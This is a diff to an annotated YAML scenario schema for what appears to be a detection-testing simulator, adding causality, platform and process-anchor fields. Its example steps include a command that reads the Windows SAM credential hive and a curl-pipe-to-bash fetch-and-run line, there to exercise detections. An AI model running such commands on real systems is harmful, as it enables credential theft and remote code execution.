@@ -214,6 +214,34 @@ steps:
         #   - detections.modeling_rules[].name     → slug "modeling-<slugified-name>"
         # Resolved by core/engine/ttp_catalog.py.
 
+    # ── Causality contract (optional, per-step) ──────────────────────────────
+    causality:
+      parent_step: "step-01"
+      # (required within causality) The id of an EARLIER step this step's
+      # process descends from. The causality graph builds a CONNECTED
+      # parent→child spine instead of hanging every step off the CGO. Must
+      # reference a step defined before this one (forward/self refs are
+      # rejected by the loader). The ROOT step OMITS the causality block —
+      # it links from the Causality Group Owner (see cgo_anchor below).
+      pivot: process_lineage
+      # (optional, default: process_lineage) The causality-graph edge kind that
+      # links this step to its parent. One of:
+      #   process_lineage · network_session · endpoint_network_stitch ·
+      #   shared_entity · exposure_exploit · exploit_impact · temporal
+      # A process_lineage pivot makes the parent step's process node own this
+      # step's process node. Any non-process pivot leaves this step rooted at
+      # the CGO and emits the declared pivot as its own typed edge.
+
+    platforms: ["linux"]
+    # (optional) OS/env coverage for this step. Subset of:
+    #   linux | windows | macos | container | k8s
+
+    platform_variants:
+      windows: "Get-Content C:\\Windows\\System32\\config\\SAM"
+      # (optional) Per-OS command equivalents so the same detection is exercised
+      # across environments. Keys must be in the platforms enum; the loader
+      # warns (non-fatal) if a variant key is not also listed in `platforms`.
+
   - id: "step-02"
     name: "Download and execute tool"
     command: "curl -sSL https://example.com/tool.sh | bash"
@@ -345,3 +373,19 @@ required_planes_in_incident:
 stitching_key: src_host
 # (F2-conventional) Field name used as the join key in verifier XQL.
 # One of: src_host | session_id | user_principal | container_id.
+
+# ── Causality Group Owner anchor (optional, back-compat) ────────────────────
+
+cgo_anchor:
+  image_name: "apache2"
+  # (required within cgo_anchor) The realistic initial-access process that OWNS
+  # the causality chain in XDR's causality view (e.g. apache2, a phishing
+  # winword.exe, containerd-shim) — NOT the synthetic cortexsim-agent beacon.
+  # Labels + names the CGO root node in the causality graph.
+  primary_username: "www-data"
+  # (optional) The CGO's primary username (the service account the initial
+  # process runs as). Drives the CGO node's primary_username. Defaults to root.
+# Absent → the graph falls back to the synthetic 'cortexsim-agent'/'root' root
+# node and the legacy star layout (fully back-compatible). Declaring cgo_anchor
+# together with per-step `causality` blocks collapses the star into one
+# connected CGO→process→process spine.
